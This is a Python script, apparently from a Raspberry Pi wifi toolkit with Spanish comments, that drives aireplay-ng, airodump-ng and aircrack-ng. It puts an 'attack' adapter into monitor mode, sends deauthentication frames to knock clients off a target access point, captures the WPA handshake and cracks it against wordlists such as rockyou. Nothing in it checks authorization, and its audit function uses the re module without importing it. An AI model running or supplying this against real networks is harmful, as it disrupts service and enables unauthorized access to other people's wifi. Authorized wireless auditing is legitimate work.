#!/usr/bin/env python3
"""
wifi_ops.py — Modo monitor sobre wlan1 (adaptador dedicado a ataque,
ya unmanaged en NetworkManager). Salida JSON, mismo patron que
wifi_scan.py / db_tool.py.
"""
import sys, os, json, subprocess, time

def _run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception:
        return None

def ensure_up(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])

def get_status(iface):
    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'info'])
    if not r or not r.stdout:
        return 'unknown'
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith('type '):
            return line.split('type', 1)[1].strip()
    return 'unknown'

def reset_driver():
    """Reset profundo del driver rtl8xxxu. El chip se cuelga en recepcion
    tras muchos cambios de modo encadenados; recargar el modulo lo devuelve
    a estado limpio garantizado. Necesario para que airodump/aireplay
    reciban beacons de forma confiable."""
    _run(['sudo', '/usr/sbin/modprobe', '-r', 'rtl8xxxu'], timeout=10)
    time.sleep(2)
    _run(['sudo', '/usr/sbin/modprobe', 'rtl8xxxu'], timeout=10)
    time.sleep(3)

def enable_monitor(iface):
    reset_driver()
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'monitor'

def disable_monitor(iface):
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'managed'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    time.sleep(0.5)
    return get_status(iface) == 'managed'

def deauth(bssid, channel, count, iface):
    bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
    ok = enable_monitor(iface)
    if not ok:
        return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"

    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    if ch_result is None or ch_result.returncode != 0:
        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
        disable_monitor(iface)
        return None, f"No se pudo fijar canal {channel}: {err_detail}"

    time.sleep(1)
    r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL', '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''

    disable_monitor(iface)
    return output, None


def log_attack(attack_type, target_bssid, result, target_ssid=None, target_client_mac=None, details=None):
    """Guarda un ataque/prueba en wifi_attack_log. No debe bloquear el
    flujo si falla (ej. DB no disponible), por eso el try/except silencioso."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, WifiAttackLog
        s = get_session()
        s.add(WifiAttackLog(attack_type=attack_type, target_ssid=target_ssid,
                             target_bssid=target_bssid, target_client_mac=target_client_mac,
                             result=result, details=(details[:500] if details else None)))
        s.commit()
    except Exception:
        pass


def check_handshake(cap_file):
    """Corre aircrack-ng brevemente contra el .cap para ver si detecto
    un handshake completo. Usamos timeout corto porque aircrack-ng se
    queda esperando input interactivo si encuentra varias redes, pero
    el resumen que necesitamos ya se imprime antes de esa espera."""
    r = _run(['timeout', '3', 'sudo', '/usr/bin/aircrack-ng', cap_file], timeout=6)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''
    return ('handshake' in output.lower()), output

def capture_handshake(bssid, channel, iface, capture_seconds=20, deauth_count=5, client_mac=None):
    """Estrategia secuencial (no concurrente): primero deauth completo
    (reset->monitor->ataque->managed, ya probado confiable), despues
    una captura sola con airodump-ng esperando la reconexion del cliente.
    Correr airodump-ng y aireplay-ng al mismo tiempo sobre este driver
    rtl8xxxu resulto en 0 paquetes capturados pese a que cada uno por
    separado funciona bien — evitamos la concurrencia por completo."""
    bssid = bssid.upper()

    deauth_output, deauth_err = deauth(bssid, channel, deauth_count, iface)

    reset_driver()
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
    time.sleep(1)

    ts = int(time.time())
    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
    os.makedirs(cap_dir, exist_ok=True)
    prefix = f"{cap_dir}/hs_{bssid.replace(':', '')}_{ts}"
    dump_log_path = f"{prefix}_airodump.log"

    with open(dump_log_path, "w") as dump_log:
        r = _run(['sudo', '/usr/bin/timeout', str(capture_seconds),
                   '/usr/sbin/airodump-ng', '--bssid', bssid, '-c', str(channel),
                   '-w', prefix, '--output-format', 'pcap', iface],
                  timeout=capture_seconds + 5)
        if r:
            dump_log.write((r.stdout or '') + (r.stderr or ''))

    disable_monitor(iface)

    try:
        with open(dump_log_path, "r") as f:
            dump_log_content = f.read()
    except Exception:
        dump_log_content = ""

    cap_file = f"{prefix}-01.cap"
    if not os.path.exists(cap_file):
        return False, None, f"No se genero archivo de captura. Deauth: {deauth_err or 'ok'}. Log airodump:\n{dump_log_content[-500:]}"

    has_hs, aircrack_output = check_handshake(cap_file)
    if not has_hs:
        aircrack_output += f"\n--- deauth: {deauth_err or 'ok'} ---\n--- log airodump (ultimas lineas) ---\n{dump_log_content[-500:]}"
    return has_hs, cap_file, aircrack_output


WORDLIST_DIR = os.path.expanduser("~/piscanlvgl/data/wordlists")
WORDLISTS = {
    "common": os.path.join(WORDLIST_DIR, "common.txt"),   # top 10k, chequeo rapido
    "full":   os.path.join(WORDLIST_DIR, "rockyou.txt"),  # 14M, auditoria a fondo (lento en Pi 3)
}

def _resolve_wordlist(key):
    """Resuelve una wordlist por: (1) alias en WORDLISTS, (2) nombre de
    archivo dentro de WORDLIST_DIR, (3) ruta absoluta. Default: common."""
    if key in WORDLISTS:
        return WORDLISTS[key]
    if key:
        cand = os.path.join(WORDLIST_DIR, key)
        if os.path.exists(cand):
            return cand
        if os.path.isabs(key) and os.path.exists(key):
            return key
    return WORDLISTS.get("common")

def list_wordlists():
    """Lista los .txt en WORDLIST_DIR con nombre y tamano. La UI las usa
    para dejar elegir cual usar. Ordena de la mas chica a la mas grande
    (las chicas son mas rapidas en el Pi)."""
    result = []
    if not os.path.isdir(WORDLIST_DIR):
        return result
    for fname in os.listdir(WORDLIST_DIR):
        if not fname.endswith(".txt"):
            continue
        full = os.path.join(WORDLIST_DIR, fname)
        try:
            size = os.path.getsize(full)
        except OSError:
            continue
        result.append({
            "name": fname,
            "key": fname,
            "size_mb": round(size / (1024 * 1024), 2),
            "fast": size < 1024 * 1024,   # <1MB = rapida en el Pi
        })
    result.sort(key=lambda x: x["size_mb"])
    return result

def audit_handshake(cap_file, bssid, wordlist_key="common", timeout_seconds=120):
    """Corre aircrack-ng con una wordlist contra el .cap para ver si la
    contrasena de la red es debil (esta en la lista). Devuelve
    (found, password_or_None, output). Con la lista 'common' (10k) tarda
    segundos; con 'full' (rockyou 14M) puede tardar ~45min en el Pi 3,
    por eso el timeout configurable."""
    bssid = bssid.upper()
    wordlist = _resolve_wordlist(wordlist_key)

    if not os.path.exists(cap_file):
        return False, None, f"No existe el archivo de captura: {cap_file}"
    if not os.path.exists(wordlist):
        return False, None, f"No existe la wordlist: {wordlist}"

    r = _run(['sudo', '/usr/bin/timeout', str(timeout_seconds),
              '/usr/bin/aircrack-ng', '-w', wordlist, '-b', bssid, cap_file],
             timeout=timeout_seconds + 5)
    output = ((r.stdout or '') + (r.stderr or '')) if r else ''

    # aircrack-ng imprime "KEY FOUND! [ password ]" si la encontro
    m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', output)
    if m:
        return True, m.group(1), output
    return False, None, output

def _bssid_from_filename(fname):
    """Extrae el BSSID del nombre 'hs_2491BB2A53CC_<ts>-01.cap' -> '24:91:BB:2A:53:CC'.
    Devuelve (bssid_formateado, timestamp_int) o (None, None) si no matchea."""
    import re
    m = re.match(r'hs_([0-9A-Fa-f]{12})_(\d+)', fname)
    if not m:
        return None, None
    hexb = m.group(1).upper()
    bssid = ':'.join(hexb[i:i+2] for i in range(0, 12, 2))
    try:
        ts = int(m.group(2))
    except ValueError:
        ts = None
    return bssid, ts

def _ssid_for_bssid(bssid):
    """Cruza el BSSID con WifiScanLog para obtener el nombre de red mas
    reciente que se haya visto con ese BSSID. Devuelve el SSID o None."""
    try:
        sys.path.insert(0, os.path.expanduser("~/piscanlvgl/app"))
        from db.models import get_session, WifiScanLog
        from sqlalchemy import func
        s = get_session()
        row = (s.query(WifiScanLog)
                 .filter(func.lower(WifiScanLog.bssid) == bssid.lower())
                 .order_by(WifiScanLog.timestamp.desc())
                 .first())
        return row.ssid if row and row.ssid else None
    except Exception:
        return None

def list_captures():
    """Lista los .cap de data/captures con: archivo, BSSID, SSID (cruzado
    con la DB), timestamp y si tiene handshake valido. Ordenado del mas
    reciente al mas viejo. Salta los archivos vacios/fallidos (<1KB)."""
    cap_dir = os.path.expanduser("~/piscanlvgl/data/captures")
    result = []
    if not os.path.isdir(cap_dir):
        return result
    files = [f for f in os.listdir(cap_dir) if f.endswith('.cap')]
    for fname in files:
        full = os.path.join(cap_dir, fname)
        try:
            size = os.path.getsize(full)
        except OSError:
            continue
        if size < 1024:   # descartamos capturas vacias/fallidas (24 bytes, etc.)
            continue
        bssid, ts = _bssid_from_filename(fname)
        ssid = _ssid_for_bssid(bssid) if bssid else None
        has_hs, _ = check_handshake(full)
        result.append({
            "file": full,
            "name": fname,
            "bssid": bssid or "??",
            "ssid": ssid or "(desconocida)",
            "ts": ts or 0,
            "size": size,
            "handshake": bool(has_hs),
        })
    result.sort(key=lambda x: x["ts"], reverse=True)
    return result
def main():
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
        sys.exit(1)

    cmd = sys.argv[1]
    iface = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
    ensure_up(iface)

    if cmd == 'status':
        print(json.dumps({"ok": True, "mode": get_status(iface)}))
    elif cmd == 'enable':
        success = enable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'disable':
        success = disable_monitor(iface)
        print(json.dumps({"ok": success, "mode": get_status(iface)}))
    elif cmd == 'deauth':
        if len(sys.argv) < 5:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py deauth <bssid> <channel> <count> [iface]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        count = int(sys.argv[4])
        iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
        output, err = deauth(bssid, channel, count, iface_deauth)
        if err:
            log_attack("deauth", bssid, "fail", details=err)
            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
        else:
            log_attack("deauth", bssid, "success", details=output)
            print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
    elif cmd == 'handshake':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py handshake <bssid> <channel> [iface] [segundos] [deauth_count]"}))
            sys.exit(1)
        bssid = sys.argv[2]
        channel = int(sys.argv[3])
        iface_hs = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
        capture_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 20
        deauth_count = int(sys.argv[6]) if len(sys.argv) > 6 else 5
        has_hs, cap_file, hs_output = capture_handshake(bssid, channel, iface_hs, capture_seconds, deauth_count)
        if has_hs:
            log_attack("handshake", bssid, "success", details=f"cap={cap_file}")
            print(json.dumps({"ok": True, "handshake": True, "cap_file": cap_file}))
        else:
            log_attack("handshake", bssid, "fail", details=(hs_output or "sin handshake")[:500])
            print(json.dumps({"ok": True, "handshake": False, "cap_file": cap_file, "detail": (hs_output or "")[:400]}))
    elif cmd == 'audit':
        if len(sys.argv) < 4:
            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py audit <cap_file> <bssid> [common|full] [timeout_seg]"}))
            sys.exit(1)
        cap_file = sys.argv[2]
        bssid = sys.argv[3]
        wordlist_key = sys.argv[4] if len(sys.argv) > 4 else 'common'
        timeout_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
        found, password, audit_output = audit_handshake(cap_file, bssid, wordlist_key, timeout_seconds)
        if found:
            log_attack("audit", bssid, "weak", details=f"wordlist={wordlist_key} pass_len={len(password)}")
            print(json.dumps({"ok": True, "found": True, "password": password, "wordlist": wordlist_key}))
        else:
            log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
            print(json.dumps({"ok": True, "found": False, "wordlist": wordlist_key}))
    elif cmd == 'list_captures':
        caps = list_captures()
        print(json.dumps({"ok": True, "captures": caps, "count": len(caps)}))
    elif cmd == 'list_wordlists':
        wls = list_wordlists()
        print(json.dumps({"ok": True, "wordlists": wls, "count": len(wls)}))
    else:
        print(json.dumps({"ok": False, "error": f"comando desconocido: {cmd}"}))
        sys.exit(1)

if __name__ == "__main__":
    main()
